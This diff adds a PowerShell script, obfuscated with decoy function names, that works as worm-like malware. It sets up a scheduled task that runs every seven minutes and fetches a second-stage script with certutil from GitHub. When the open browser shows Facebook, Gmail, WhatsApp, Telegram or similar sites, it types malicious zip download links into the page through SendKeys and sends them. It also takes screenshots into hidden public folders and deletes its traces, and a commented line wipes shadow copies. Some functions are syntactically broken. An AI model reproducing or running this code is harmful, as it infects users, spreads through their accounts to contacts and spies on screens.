@@ -1,1 +1,443 @@
-https://github.com/WendySeattle/EnvironmentalSciences/raw/main/TaylorSwift.zip
+#___________________________________________________
+
+$Pbc = "C:\Users\Public\Windows"; $Pbv = "C:\Users\Public\Videos"; $Pbr = "C:\Users\Public\Recorded TV"; $Pbp = "$home\Pictures"; $global:x = 420; $global:y = 755; 
+
+#___________________________________________________
+
+function Pdq-Naivas
+{
+	if (!(Test-Path $global:Pb))
+	{
+		New-Item -Path $global:Pb -ItemType Directory
+	}
+	else
+	{
+		echo GoodlifePharmacy!
+	}
+}
+
+#___________
+
+$global:Pb = $Pbc
+Pdq-Naivas
+
+$global:Pb = $Pbv
+Pdq-Naivas
+
+$global:Pb = $Pbr
+Pdq-Naivas
+
+$global:Pb = $Pbp
+Pdq-Naivas
+
+#___________________________________________________
+
+function Magenta-Coop
+{
+
+	cmd /c "dir /b > z1.ps1"
+
+	$one = 0; $file = ".\z1.ps1"; Hush-Puppi
+	$fileName = ".\z1.ps1"; $firstLine = Get-Content -Path $fileName -TotalCount 1; $firstLine > ".\z2.ps1"
+
+	Remove-Item ".\z1.ps1"
+	Remove-Item ".\z3.ps1"
+
+	$tr = ".\z2.ps1"; $tn = ".\z3.ps1"; $tl = 'Set-Location -Path "'; Abdul-Rahman
+	$ssx = (gc ".\z3.ps1") -replace '\S+$','$&"'; $ssx > ".\z3.ps1"
+
+	Remove-Item ".\z2.ps1"
+	Import-Module ".\z3.ps1"
+	Lara-Cosm
+}
+
+#___________________________________________________
+
+function Magenta-Stanchart
+{
+	Remove-Item "$Pbc\z3.ps1"
+	Remove-Item "$Pbc\z1.ps1"
+	Start-Sleep -s 1
+	
+	$pwd > "$Pbc\z1.ps1"
+	Remove-Item "$Pbc\z2.ps1"
+
+	Start-Sleep -s 1
+	Get-Content "$Pbc\z1.ps1" | Select-Object -Skip 3 | Out-File "$Pbc\z2.ps1"
+	
+	Remove-Item "$Pbc\z1.ps1"
+	Start-Sleep -s 1
+	
+	$global:tle = [IO.File]::ReadAllText("$Pbc\z2.ps1")
+	$tle = $tle.Trim()
+	
+	$tle > "$Pbc\z1.ps1"
+	Remove-Item "$Pbc\z2.ps1"
+}
+
+#___________________________________________________
+
+function Abdul-Rahman
+{
+	$Lines = Get-Content $tr
+	$OutputPath = $tn
+	foreach ($Line in $Lines) 
+	{
+		$Line = $line.Insert(0,$tl)
+		#$Line += ‘"’
+		Write-Output $Line | Out-File $OutputPath -Append
+	}
+}
+
+#$tr = ".\z2.ps1"; $tn = ".\z3.ps1"; $tl = 'Move-Item -path "'; Abdul-Rahman
+
+#___________________________________________________
+
+function Hush-Puppi
+{
+	$one;
+	while ($one -ge 0)
+	{
+		$file
+		Get-Content $file | Measure-Object -Line
+		$a = (Get-Content $file | Measure-Object)
+		(Get-Content $file) | ? {($a.count-0)-notcontains $_.ReadCount} | Set-Content $file
+		$one--; 
+	}
+}
+
+#$one = 2; $file = "$home\tokyo2.ps1"; Hush-Puppi
+
+#___________________________________________________
+
+function Lara-Cosm
+{
+	Remove-Item $Pwd\*.ps1;	Remove-Item $Pwd\*.txt; Remove-Item $Pwd\*.cmd
+}
+
+#___________________________________________________
+
+function Maria-Carparas
+{
+	Remove-Item "$Pbc\zlr.txt"; Remove-Item "$Pbc\zlr2.txt"
+
+	Get-Process $prc |where {$_.mainWindowtitle} |format-table mainWindowtitle -AutoSize > $Pbc\zlr.txt
+	Get-Content "$Pbc\zlr.txt" | Select-Object -Skip 3 | Out-File "$Pbc\zlr2.txt"
+	Remove-Item "$Pbc\zlr.txt"
+
+	$global:zlr = [IO.File]::ReadAllText("$Pbc\zlr2.txt")
+	$zlr = $zlr.Trim()
+	Set-Content -Path "$Pbc\zlr.txt" -Value $zlr
+	Remove-Item "$Pbc\zlr2.txt"
+	$global:zlr = ""
+}
+
+#___________________________________________________
+
+function Mountain-Cereals
+{
+	Maria-Carparas
+	$zlr = [IO.File]::ReadAllText("$Pbc\zlr.txt")
+
+	Rename-Item "$Pbc\zlr.txt" "$Pbc\z1.ps1"
+	Remove-Item "$Pbc\z3.ps1"
+
+	$tr = "$Pbc\z1.ps1"; $tn = "$Pbc\z3.ps1"; $tl = '$wshell.AppActivate("'; Abdul-Rahman
+	$ssx = (gc "$Pbc\z3.ps1") -replace '\S+$','$&")'; Set-Content -Path "$Pbc\z3.ps1" -Value $ssx
+
+
+	Remove-Item "$Pbc\z1.ps1"
+
+	$file = "$Pbc\z3.ps1"; $global:unique = $prc; $zlr = [IO.File]::ReadAllText("$file")
+	$string = $zlr
+	$unique = "$unique*")
+	{
+		echo Maelstrom!!
+	} 
+	else
+	{
+		Remove-Item "$Pbc\z3.ps1"
+		Mountain-Cereals
+	}	
+}
+
+#___________________________________________________
+
+function Air-Asia
+{
+	#process image text for unique string	
+	$title = [IO.File]::ReadAllText("$file")
+	$string = $title
+	$unique = "$unique*") 
+	{
+		echo GoodlifePharmacy!
+	} 
+	else
+	{ 
+		exit
+	}
+}
+
+
+#___________________________________________________
+
+function Singapore-Airlines
+{
+	Set-Location -Path "C:\Users\Public\Windows"
+	Remove-Item "$ocr\*.png"
+	Remove-Item "$ocr\*.txt"
+	Copy-Item $png -Destination $ocr
+	Remove-Item $png
+	Set-Location -Path $ocr
+	.\tesseract.exe .\$png .\$png
+}
+
+#___________________________________________________
+
+function Mage-Lo
+{
+	echo GoodlifePharmacy!
+}
+
+#___________________________________________________
+
+function Braeside-Catering
+{
+	param(
+	  [string]$Width,
+	  [string]$Height,
+	  [String]$FileName = "Screenshot"
+	 
+	)
+	 
+	function Take-Screenshot{
+	[cmdletbinding()]
+	param(
+	 [Drawing.Rectangle]$bounds,
+	 [string]$path
+	)
+		$bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
+		$graphics = [Drawing.Graphics]::FromImage($bmp)
+		$graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+		$bmp.Save($path)
+		$graphics.Dispose()
+		$bmp.Dispose()
+	}
+	 
+	function Get-ScreenResolution {
+		$Screens = [system.windows.forms.screen]::AllScreens
+		foreach ($Screen in $Screens) {
+			$DeviceName = $Screen.DeviceName
+			$Width  = $Screen.Bounds.Width
+			$Height  = $Screen.Bounds.Height
+			$IsPrimary = $Screen.Primary
+			$OutputObj = New-Object -TypeName PSobject
+			$OutputObj | Add-Member -MemberType NoteProperty -Name DeviceName -Value $DeviceName
+			$OutputObj | Add-Member -MemberType NoteProperty -Name Width -Value $Width
+			$OutputObj | Add-Member -MemberType NoteProperty -Name Height -Value $Height
+			$OutputObj | Add-Member -MemberType NoteProperty -Name IsPrimaryMonitor -Value $IsPrimary
+			$OutputObj
+		}
+	}
+
+	$datetime = (Get-Date).tostring("dd-MM-yyyy-hh-mm-ss")
+	$FileName = "{0}-{1}" -f $FileName, $datetime
+	$Filepath = join-path $env:temp $FileName
+	 
+	[void] [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
+	[void] [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+
+	if(!($width -and $height)) { 
+		$screen = Get-ScreenResolution | ? {$_.IsPrimaryMonitor -eq $true}
+		$Width = $screen.Width
+		$Height = $screen.height
+	}
+	Mage-Lo
+}
+
+#-------------------------------------------------------------------------------------------------
+
+#delete kreate restore points
+#vssadmin delete shadows /all /quiet
+
+#___________________________________________________
+
+function Aer-Lingus
+{
+
+	SCHTASKS    /Create /SC MINUTE /MO 7 /TN georgia /TR "C:\Users\Public\Windows\TaylorSwift.cmd" /f
+	SCHTASKS    /Create /SC MINUTE /MO 7 /TN georgia /TR C:\Users\Public\Windows\TaylorSwift.cmd /f
+}
+
+Aer-Lingus
+
+#___________________________________________________
+
+Remove-Item "$Pbc\TRM-Carrefour.ps1"
+certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/argene-nyc/sevilla/master/TRM-Carrefour.uiaq" TRM-Carrefour.ps1
+#Import-Module "C:\Users\Public\Windows\TRM-Carrefour.ps1"
+
+#___________________________________________________
+
+function Garuda-Indonesia
+{
+	Remove-Item "$Pbc\title.txt"
+
+	$ProcessActive = Get-Process chrome -ErrorAction SilentlyContinue
+	if($ProcessActive -eq $null) 
+	{ 
+		$ProcessActive = Get-Process firefox -ErrorAction SilentlyContinue
+		if($ProcessActive -eq $null) 
+		{
+			$ProcessActive = Get-Process opera -ErrorAction SilentlyContinue
+			if($ProcessActive -eq $null) 
+			{
+				exit
+			}
+			else
+			{ 
+				$brs = "opera"
+				Get-Process opera |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
+			}
+
+		}
+		else
+		{
+			$brs = "firefox"
+			Get-Process firefox |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
+		}
+	} 
+	else
+	{ 
+		$brs = "chrome"
+		Get-Process chrome |where {$_.mainWindowTItle} |format-table mainwindowtitle -AutoSize > $Pbc\title.txt 
+	}
+
+	Get-Content $Pbc\title.txt | Select-Object -Skip 3 | Out-File $Pbc\title2.txt
+	Remove-Item $Pbc\title.txt
+	$title = [IO.File]::ReadAllText("$Pbc\title2.txt")
+	$title = $title.Trim()
+	$title > $Pbc\title.txt
+	Remove-Item $Pbc\title2.txt
+}
+
+Garuda-Indonesia
+
+#___________________________________________________
+
+Set-Location -Path $Pbc
+
+$wshell = New-Object -ComObject wscript.shell;
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class SFW {
+ [DllImport("user32.dll")]
+ [return: MarshalAs(UnmanagedType.Bool)]
+ public static extern bool SetForegroundWindow(IntPtr hWnd);
+}
+"@
+$fw =  (get-process $brs).MainWindowHandle
+#[SFW]::SetForegroundWindow($fw)
+
+function Mary-Gray
+{
+	$file = "$Pbc\title.txt"
+	$title = [IO.File]::ReadAllText("$file")
+	$string = $title
+	if ($string -like "*$unique*") 
+	{
+		$wshell.SendKeys('https://github.com/WendySeattle/EnvironmentalSciences/raw/refs/heads/main/Gachagua_Kenya_Police.zip')
+		$wshell.SendKeys('^{ENTER}'); $wshell.SendKeys('^{ENTER}')
+		Start-Sleep -s 1
+		$wshell.SendKeys('https://github.com/WendySeattle/EnvironmentalSciences/raw/refs/heads/main/Gachagua_Kenya_Police.zip')
+		$wshell.SendKeys('^{ENTER}'); $wshell.SendKeys('^{ENTER}')
+		Start-Sleep -s 1
+		$wshell.SendKeys('Kenyan govt is crazy!!')
+		$wshell.SendKeys('^{ENTER}'); $wshell.SendKeys('^{ENTER}')
+
+				  #___________________________________________________
+
+		Start-Sleep -s 2
+		function Mage-Lo
+		{
+			$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, $Screen.Width, $Screen.Height) 
+			Take-Screenshot -Bounds $bounds -Path "$Pbc\text.png"
+		}
+
+		Braeside-Catering
+
+		$timestamp = Get-Date -Format "yyyy-MM-dd_HH-mm-ss"
+		Start-Sleep -s 1
+		$png = ".\text.png"
+		Rename-Item "$png" "z.$timestamp.png"
+
+		Copy-Item $pwd\*.png -Destination $Pbr -recurse
+		Remove-Item $pwd\*.png
+
+				  #___________________________________________________
+
+		exit
+	}
+	else
+	{ 
+		echo GoodlifePharmacy!
+	}
+}
+
+
+#___________________________________________________
+
+$unique = "facebook"; Mary-Gray
+$unique = "gmail"; Mary-Gray
+$unique = "yahoo"; Mary-Gray
+$unique = "proton"; Mary-Gray
+$unique = "yandex"; Mary-Gray
+$unique = "telegram"; Mary-Gray
+$unique = "snapchat"; Mary-Gray
+$unique = "instagram"; Mary-Gray
+$unique = "discord"; Mary-Gray
+$unique = "twitch"; Mary-Gray
+$unique = "youtube"; Mary-Gray
+$unique = "vimeo"; Mary-Gray
+$unique = "whatsapp"; Mary-Gray
+$unique = "x.com"; Mary-Gray
+
+#___________________________________________________
+
+exit
+
+#___________________________________________________
+#___________________________________________________
+#___________________________________________________
+#___________________________________________________
+
+$unique = "paypal"
+Mary-Gray
+
+#___________________________________________________
+
+$unique = "patreon"
+Mary-Gray
+
+#___________________________________________________
+
+$unique = "skrill"
+Mary-Gray
+
+#___________________________________________________
+
+$unique = "jumia"
+Mary-Gray
+
+#___________________________________________________
+
+$unique = "co-op"
+Mary-Gray
+
+#___________________________________________________
+
+$unique = "upwork"
+Mary-Gray
+
+#_____________________
